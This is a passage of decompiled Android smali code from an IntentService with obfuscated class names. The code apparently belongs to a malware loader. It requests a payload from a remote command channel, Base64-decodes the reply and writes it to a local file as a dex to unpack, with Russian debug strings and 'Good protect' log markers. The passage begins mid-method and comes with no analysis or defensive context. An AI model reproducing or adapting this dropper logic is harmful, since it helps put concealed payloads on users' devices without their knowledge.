    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "ukhakhcgifofl"

    const-string v8, "Good protect 1"

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v6

    if-nez v6, :cond_4a

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "ukhakhcgifofl"

    const-string v8, "Good protect 2"

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v9, "14"

    const-string v10, "p=1"

    invoke-virtual {v7, v8, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    const/16 v8, 0x3e8

    if-le v7, v8, :cond_4a

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_25

    const/4 v7, 0x0

    :try_start_27
    invoke-static {v6, v7}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v6
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_26

    :try_start_28
    new-instance v8, Ljava/io/FileOutputStream;
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_23

    const/4 v9, 0x1

    :try_start_29
    invoke-direct {v8, v5, v9}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    invoke-virtual {v8, v6}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v8}, Ljava/io/FileOutputStream;->close()V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v8, "Good protect 3"

    invoke-virtual {v5, v6, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_24

    goto :goto_2c

    :catch_23
    const/4 v9, 0x1

    :catch_24
    :try_start_2a
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v8, "\u0420\u0430\u0441\u043f\u0430\u043a\u043e\u0432\u043a\u0430 \u0434\u0435\u043a\u0441\u0430 ERROR"

    invoke-virtual {v5, v6, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_27

    goto :goto_2c

    :catch_25
    const/4 v7, 0x0

    :catch_26
    const/4 v9, 0x1

    :catch_27
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ukhakhcgifofl"

    const-string v8, "ERROR -> \u0434\u0435\u043a\u0441"

    invoke-virtual {v5, v6, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2c

    :cond_4a
    const/4 v7, 0x0

    const/4 v9, 0x1

    :goto_2c
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "ServiceComm"

    invoke-virtual {v5, v1, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;)V

    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_12

    :cond_4b
    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->stopSelf()V

    return-void
.end method

.method b(Ljava/lang/String;)V
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/BufferedWriter;

    new-instance v1, Ljava/io/OutputStreamWriter;

    const/4 v2, 0x0

    invoke-virtual {p0, p1, v2}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object p1

    invoke-direct {v1, p1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    const-string p1, ""

    invoke-virtual {v0, p1}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 0

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/IntentService;->onStartCommand(Landroid/content/Intent;II)I

    const/4 p1, 0x1

    return p1
.end method
